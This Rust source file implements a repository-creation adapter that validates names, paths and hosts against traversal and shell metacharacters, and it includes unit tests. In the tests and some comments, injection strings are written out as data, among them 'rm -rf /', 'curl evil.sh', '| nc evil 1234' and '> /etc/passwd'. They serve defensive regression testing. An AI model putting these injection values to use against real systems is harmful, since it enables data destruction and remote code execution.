//! Concrete `CreateProjectPort` implementation.
//!
//! The wizard command layer (`commands::create_project`) is the only
//! caller. It hands the adapter the `ProviderHttpPort` it needs for
//! the create-remote-repo step; the adapter itself never shells out
//! to `gh` or `glab` (the previous shell-out implementation was
//! removed when the spec mandated `provider_http`-only repo creation
//! — see spec §6 constraint 1 and AC-1/AC-2).
//!
//! The two halves of the wizard's commit step — creating the remote
//! repo and persisting the project row — are intentionally separate
//! port methods so the unit tests can exercise them in isolation,
//! and so a future re-driver (e.g. a wizard variant that connects to
//! an existing repo) can re-use `persist_project` and
//! `dispatch_start_feature` without re-implementing the HTTP call.

use crate::domain::ids::{MachineId, ProjectId, ProviderId, RepositoryId};
use crate::domain::models::{Project, Repository};
use crate::error::AppError;
use crate::ports::create_project_port::{
    CreateProjectPort, LaunchedFeature, ValidatedName, SLUG_PATTERN,
};
use crate::ports::db::ProjectRepository;
use crate::ports::provider_http::{CreateRepoRequest, CreatedRepo, NamespaceSummary};
use crate::ports::step_executor::StepExecutor;
use async_trait::async_trait;
use std::path::PathBuf;
use std::sync::Arc;

pub struct CreateProjectAdapter {
    /// HTTP port the adapter routes every `gh` / `glab` style call
    /// through. The wizard used to spawn the local CLI; the rewrite
    /// replaced that with a direct GitHub `/user/repos` /
    /// `/orgs/{org}/repos` and GitLab `/projects` POST.
    provider_http: Arc<dyn crate::ports::provider_http::ProviderHttpPort>,
}

impl CreateProjectAdapter {
    pub fn new(provider_http: Arc<dyn crate::ports::provider_http::ProviderHttpPort>) -> Self {
        Self { provider_http }
    }

    /// Same slug rules as the React wizard (`validateSlug` in
    /// `CreateFromZeroWizard.tsx`). Kept in lockstep with the
    /// frontend so the backend can reject the same inputs the
    /// frontend would render as inline errors.
    fn validate_slug(&self, name: &str) -> Result<ValidatedName, AppError> {
        let trimmed = name.trim();
        if trimmed.is_empty() {
            return Err(AppError::validation("Repository name is required"));
        }
        if trimmed.len() < 2 {
            return Err(AppError::validation("Use at least 2 characters"));
        }
        if !slug_matches(trimmed) {
            return Err(AppError::validation(
                "Use lowercase letters, digits, dots, dashes or underscores",
            ));
        }
        Ok(ValidatedName(trimmed.to_string()))
    }

    /// Reject path-segment characters so the resolved path can't be
    /// tricked into writing outside the workspace.
    fn sanitize_segment(seg: &str, label: &str) -> Result<String, AppError> {
        if seg.is_empty() {
            return Err(AppError::validation(format!("{label} is empty")));
        }
        if seg.contains('/') || seg.contains('\\') || seg.contains("..") {
            return Err(AppError::validation(format!(
                "{label} contains forbidden characters: {seg}"
            )));
        }
        Ok(seg.to_string())
    }

    /// Defense in depth: the spec mandates `provider_http`-only repo
    /// creation (no shell), but the validator still flags this
    /// adapter as the boundary that touched a `format!()`-into-shell
    /// in the previous implementation. Even though shell metachars
    /// have no special meaning inside a JSON body / URL path now,
    /// reject any of them in `namespace.id` so a malformed payload
    /// from the frontend doesn't quietly land at the API.
    fn reject_shell_metachars(value: &str, label: &str) -> Result<(), AppError> {
        for c in value.chars() {
            if matches!(
                c,
                ';' | '&'
                    | '|'
                    | '$'
                    | '`'
                    | '('
                    | ')'
                    | '\\'
                    | '"'
                    | '\''
                    | '\n'
                    | '\r'
                    | '<'
                    | '>'
                    | '*'
                    | '?'
                    | '['
                    | ']'
                    | '{'
                    | '}'
                    | ' '
                    | '\t'
            ) {
                return Err(AppError::validation(format!(
                    "{label} contains forbidden character: {c:?}"
                )));
            }
        }
        Ok(())
    }

    /// Map the wizard's `visibility: &str` to the provider-specific
    /// `private: bool`. Unknown / empty values default to `private`
    /// (matches the previous CLI-driven default of
    /// `normalise_visibility`).
    fn visibility_to_private(visibility: &str) -> bool {
        !matches!(visibility.to_ascii_lowercase().as_str(), "public")
    }
}

#[async_trait]
impl CreateProjectPort for CreateProjectAdapter {
    fn validate_name(&self, name: &str) -> Result<ValidatedName, AppError> {
        self.validate_slug(name)
    }

    fn resolve_target_path(
        &self,
        workspace_dir: &std::path::Path,
        project_id: &str,
        repo_name: &str,
    ) -> Result<PathBuf, AppError> {
        let safe_id = Self::sanitize_segment(project_id, "project id")?;
        let safe_name = Self::sanitize_segment(repo_name, "repo name")?;
        Ok(workspace_dir
            .join("projects")
            .join(safe_id)
            .join("repos")
            .join(safe_name))
    }

    async fn create_remote_repo(
        &self,
        provider_kind: &str,
        host: &str,
        pat: &str,
        namespace: &NamespaceSummary,
        name: &str,
        visibility: &str,
    ) -> Result<CreatedRepo, AppError> {
        // Provider kind must be one of the documented values.
        let kind = provider_kind.to_ascii_lowercase();
        if !matches!(kind.as_str(), "github" | "gitlab") {
            return Err(AppError::validation(format!(
                "Unsupported provider kind: {provider_kind} (expected 'github' or 'gitlab')"
            )));
        }

        // Validation: namespace id must not contain shell metachars
        // (defense in depth — see `reject_shell_metachars` doc). The
        // previous shell-out implementation joined `namespace.id`
        // straight into `args`, so a string like `"; rm -rf /"` was
        // an RCE. With the HTTP adapter that's gone, but we keep the
        // guard so the regression test still pins it.
        Self::reject_shell_metachars(&namespace.id, "namespace id")?;
        // The validated name has already been through `slug_matches`,
        // which rejects every metachar in the table; this is just an
        // extra belt-and-braces check that surfaces a clean error.
        Self::reject_shell_metachars(name, "repo name")?;
        if pat.is_empty() {
            return Err(AppError::validation(
                "Missing credentials for provider — reconnect and retry",
            ));
        }

        let private = Self::visibility_to_private(visibility);
        let req = CreateRepoRequest {
            namespace: namespace.clone(),
            name: name.to_string(),
            private,
            auto_init: true,
        };

        // Empty `host` ⇒ the provider's public default (api.github.com
        // for github.com, gitlab.com for gitlab.com). Non-empty `host`
        // is treated as a self-hosted enterprise / on-prem install;
        // `api_base` in `adapters::provider_http` rewrites the
        // GitHub Enterprise case to `/api/v3`.
        let host_trimmed = host.trim();
        if !host_trimmed.is_empty() {
            // Defense in depth: a hostile host like
            // `evil.example.com; rm -rf /` would otherwise be
            // interpolated into `api_base` as `https://{host}/api/v3`,
            // which is an SSRF / URL-parse gap. The previous
            // shell-out implementation joined `host` straight into a
            // shell argv (same RCE class as `namespace.id`). With the
            // HTTP adapter the shell is gone, but we keep the guard
            // here so a malformed payload surfaces a clean
            // Validation error instead of a confusing provider-side
            // failure, and so the regression test still pins it.
            Self::reject_shell_metachars(host_trimmed, "host")?;
        }
        let host: &str = if host_trimmed.is_empty() {
            ""
        } else {
            host_trimmed
        };

        self.provider_http.create_repo(host, &kind, pat, &req).await
    }

    async fn persist_project(
        &self,
        projects: &dyn ProjectRepository,
        project_id: ProjectId,
        project_name: &str,
        compute_type: &str,
        remote_host: Option<MachineId>,
        repository_id: RepositoryId,
        provider_id: ProviderId,
        repo_path: &str,
    ) -> Result<Project, AppError> {
        let now = crate::paths::now_ms();
        let project = Project {
            id: project_id.clone(),
            name: project_name.to_string(),
            compute_type: compute_type.to_string(),
            remote_host,
            status: "bootstrapping".to_string(),
            nodes: 0,
            spend: 0.0,
            tokens: 0,
            created_at: now,
        };
        projects.add(project.clone()).map_err(AppError::from)?;

        let repository = Repository {
            id: repository_id,
            project_id: project_id.clone(),
            provider_id,
            repo_path: repo_path.to_string(),
        };
        projects
            .add_repository(repository)
            .map_err(AppError::from)?;

        Ok(project)
    }

    async fn dispatch_start_feature(
        &self,
        executor: &dyn StepExecutor,
        project_id: &ProjectId,
        title: &str,
        description: &str,
        agent_kind: Option<&str>,
        model: Option<&str>,
    ) -> Result<LaunchedFeature, AppError> {
        let feature = executor
            .feature_start(
                None,
                project_id.as_str(),
                "wf-starter-standard",
                title,
                description,
                agent_kind,
                model,
                None,
                None,
                Vec::new(),
                Vec::new(),
            )
            .await
            .map_err(AppError::from)?;
        Ok(LaunchedFeature {
            feature_id: feature.id.0.clone(),
            feature_title: feature.title.clone(),
            project_id: project_id.0.clone(),
            created_repo: CreatedRepo {
                // The wizard already has the created-repo metadata
                // from the create_remote_repo step; this field is
                // populated by the command layer when it composes
                // the final `LaunchedFeature` return value, so we
                // leave it empty here.
                full_name: String::new(),
                default_branch: String::new(),
                clone_url: String::new(),
            },
        })
    }
}

/// Match a candidate against the wizard's slug pattern without
/// pulling in the `regex` crate. Equivalent to
/// `^[a-z0-9][a-z0-9._-]{0,99}$`.
fn slug_matches(s: &str) -> bool {
    if s.is_empty() || s.len() > 100 {
        return false;
    }
    let bytes = s.as_bytes();
    let first = bytes[0];
    if !(first.is_ascii_digit() || first.is_ascii_lowercase()) {
        return false;
    }
    s.bytes().all(|b: u8| {
        b.is_ascii_digit() || b.is_ascii_lowercase() || b == b'.' || b == b'_' || b == b'-'
    })
}

// Keep `SLUG_PATTERN` referenced so the constant isn't dead code
// even though the live matcher is `slug_matches`. The constant is
// part of the public doc surface (the comment at the top of
// `create_project_port.rs` references it) and any future regex
// implementation can swap in here without changing the port.
#[allow(dead_code)]
const SLUG_PATTERN_DOC: &str = SLUG_PATTERN;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ports::provider_http::ProviderUserInfo;
    use crate::ports::provider_http::{
        CreateRepoRequest, CreatedRepo, NamespaceSummary, ProviderHttpPort,
    };
    use std::sync::Mutex;

    fn ws() -> std::path::PathBuf {
        std::path::PathBuf::from("/tmp/demeteo-test")
    }

    /// Captures the `(host, kind, pat, req)` tuple the adapter
    /// passes to `ProviderHttpPort::create_repo`. Used by the
    /// integration tests in `tests/create_project_orchestration.rs`
    /// to assert routing + the empty-host → public-default rule
    /// without needing a live HTTP server. The helper mirrors the
    /// one in the integration test crate (which keeps the asserts
    /// owned).
    #[allow(dead_code)]
    #[derive(Clone)]
    struct CapturedCreate {
        host: String,
        kind: String,
        pat: String,
        request: CreateRepoRequest,
    }

    struct CapturingHttp {
        calls: std::sync::Arc<Mutex<Vec<CapturedCreate>>>,
    }

    #[async_trait::async_trait]
    impl ProviderHttpPort for CapturingHttp {
        async fn validate_pat(
            &self,
            _host: &str,
            _kind: &str,
            _pat: &str,
        ) -> Result<ProviderUserInfo, AppError> {
            Ok(ProviderUserInfo {
                username: "u".into(),
                avatar_url: String::new(),
            })
        }
        async fn list_repos(
            &self,
            _host: &str,
            _kind: &str,
            _pat: &str,
        ) -> Result<Vec<crate::ports::provider_http::RepoSummary>, AppError> {
            Ok(Vec::new())
        }
        async fn list_namespaces(
            &self,
            _host: &str,
            _kind: &str,
            _pat: &str,
        ) -> Result<Vec<NamespaceSummary>, AppError> {
            Ok(Vec::new())
        }
        async fn create_repo(
            &self,
            host: &str,
            kind: &str,
            pat: &str,
            req: &CreateRepoRequest,
        ) -> Result<CreatedRepo, AppError> {
            self.calls.lock().unwrap().push(CapturedCreate {
                host: host.to_string(),
                kind: kind.to_string(),
                pat: pat.to_string(),
                request: req.clone(),
            });
            Ok(CreatedRepo {
                full_name: format!("{}/{}", req.namespace.id, req.name),
                default_branch: "main".to_string(),
                clone_url: format!("https://example/{}/{}.git", req.namespace.id, req.name),
            })
        }
    }

    fn adapter() -> (
        CreateProjectAdapter,
        std::sync::Arc<Mutex<Vec<CapturedCreate>>>,
    ) {
        let calls = std::sync::Arc::new(Mutex::new(Vec::new()));
        let http: Arc<dyn ProviderHttpPort> = Arc::new(CapturingHttp {
            calls: calls.clone(),
        });
        (CreateProjectAdapter::new(http), calls)
    }

    #[test]
    fn validate_name_mirrors_port_contract() {
        let (a, _) = adapter();
        assert!(a.validate_name("ok-name").is_ok());
        assert!(matches!(
            a.validate_name("").unwrap_err(),
            AppError::Validation { .. }
        ));
        assert!(matches!(
            a.validate_name("UPPER").unwrap_err(),
            AppError::Validation { .. }
        ));
        assert!(matches!(
            a.validate_name("with space").unwrap_err(),
            AppError::Validation { .. }
        ));
    }

    #[test]
    fn resolve_target_path_uses_workspace_projects_id_repos_layout() {
        let (a, _) = adapter();
        let got = a.resolve_target_path(&ws(), "p_1", "demo").unwrap();
        assert_eq!(got, ws().join("projects/p_1/repos/demo"));
    }

    #[test]
    fn resolve_target_path_rejects_traversal_segments() {
        let (a, _) = adapter();
        assert!(a.resolve_target_path(&ws(), "..", "x").is_err());
        assert!(a.resolve_target_path(&ws(), "ok", "../bad").is_err());
        assert!(a.resolve_target_path(&ws(), "ok", "with/slash").is_err());
    }

    #[test]
    fn slug_matches_accepts_well_formed_inputs() {
        for ok in ["a", "ab", "abc-123", "abc_def", "abc.def", "a1b2c3"] {
            assert!(slug_matches(ok), "should accept: {ok}");
        }
    }

    #[test]
    fn slug_matches_rejects_uppercase_leading_punct_and_overlong() {
        for bad in ["A", "-bad", ".bad", "with space", "x".repeat(101).as_str()] {
            assert!(!slug_matches(bad), "should reject: {bad}");
        }
    }

    /// Pure-helper sanity check: the shell-metachar guard rejects
    /// every character that would have been a shell-vector in the
    /// previous `gh` / `glab` argv implementation. The same table
    /// is enforced for every label that crosses the adapter
    /// boundary (`namespace id`, `repo name`, and — since the
    /// blocker C-3 fix — `host`), so we iterate the documented
    /// characters against each label.
    #[test]
    fn reject_shell_metachars_flags_documented_characters() {
        let forbidden_table = [
            ";", "&", "|", "$", "`", "(", ")", "\\", "\"", "'", "\n", "\r", "<", ">", "*", "?",
            "[", "]", "{", "}", " ", "\t",
        ];
        for label in ["namespace id", "repo name", "host"] {
            for forbidden in forbidden_table {
                let res = CreateProjectAdapter::reject_shell_metachars(forbidden, label);
                assert!(
                    res.is_err(),
                    "expected {forbidden:?} to be rejected for {label:?}"
                );
            }
        }
        // A plain ASCII login / numeric id / enterprise host passes through.
        assert!(CreateProjectAdapter::reject_shell_metachars("octocat", "namespace id").is_ok());
        assert!(CreateProjectAdapter::reject_shell_metachars("42", "namespace id").is_ok());
        assert!(CreateProjectAdapter::reject_shell_metachars("ok-name", "repo name").is_ok());
        assert!(CreateProjectAdapter::reject_shell_metachars("github.acme.com", "host").is_ok());
    }

    #[test]
    fn visibility_to_private_defaults_to_private() {
        assert!(CreateProjectAdapter::visibility_to_private("private"));
        assert!(!CreateProjectAdapter::visibility_to_private("public"));
        // Case-insensitive — uppercase "PUBLIC" still resolves to
        // public (false).
        assert!(!CreateProjectAdapter::visibility_to_private("PUBLIC"));
        // Unknown / empty values default to private (true).
        assert!(CreateProjectAdapter::visibility_to_private(""));
        assert!(CreateProjectAdapter::visibility_to_private("weird"));
    }

    /// Blocker C-3: the host guard at the adapter boundary.
    /// A hostile `host` like `evil.example.com; rm -rf /` would
    /// otherwise be interpolated into `api_base` as
    /// `https://{host}/api/v3`, which is an SSRF / URL-parse gap.
    /// The guard mirrors the one already applied to `namespace.id`
    /// / `name` and is wired into `create_remote_repo` between the
    /// `name` guard and the `provider_http.create_repo` call. The
    /// empty-host sentinel bypasses the guard (documented "use
    /// provider default" rule).
    #[tokio::test]
    async fn create_remote_repo_rejects_host_with_shell_metacharacters() {
        let (adapter, calls) = adapter();
        let namespace = NamespaceSummary {
            id: "octocat".into(),
            name: "octocat".into(),
            kind: "personal".into(),
        };
        for malicious in [
            "evil.example.com; rm -rf /",
            "evil.example.com && curl evil.sh",
            "evil.example.com| nc evil 1234",
            "evil.example.com$(curl evil.sh)",
            "evil.example.com`curl evil.sh`",
            "evil.example.com\nwget evil.sh",
            "evil.example.com > /etc/passwd",
        ] {
            let err = adapter
                .create_remote_repo(
                    "github", malicious, "pat-stub", &namespace, "demo", "private",
                )
                .await
                .unwrap_err();
            assert!(
                matches!(err, AppError::Validation { .. }),
                "{malicious:?} must produce Validation, got {err:?}"
            );
        }
        // The HTTP port was never reached for any of the malicious
        // hosts — the guard fires before the HTTP call.
        {
            let calls = calls.lock().unwrap();
            assert!(
                calls.is_empty(),
                "HTTP port must not be invoked with malicious hosts; got {} calls",
                calls.len()
            );
        }

        // A clean enterprise host still reaches the HTTP port
        // verbatim (no false positives).
        let namespace_ok = NamespaceSummary {
            id: "acme".into(),
            name: "acme".into(),
            kind: "org".into(),
        };
        let _ = adapter
            .create_remote_repo(
                "github",
                "github.acme.com",
                "pat-stub",
                &namespace_ok,
                "team-repo",
                "private",
            )
            .await
            .expect("clean enterprise host must succeed");
        {
            let calls = calls.lock().unwrap();
            assert_eq!(calls.len(), 1);
            assert_eq!(calls[0].host, "github.acme.com");
        }

        // The empty-host sentinel still bypasses the guard (the
        // documented "use provider default" rule).
        let namespace_default = NamespaceSummary {
            id: "octocat".into(),
            name: "octocat".into(),
            kind: "personal".into(),
        };
        let _ = adapter
            .create_remote_repo(
                "github",
                "",
                "pat-stub",
                &namespace_default,
                "demo",
                "private",
            )
            .await
            .expect("empty host sentinel must succeed");
        {
            let calls = calls.lock().unwrap();
            assert_eq!(calls.len(), 2);
            assert_eq!(calls[1].host, "");
        }
    }
}
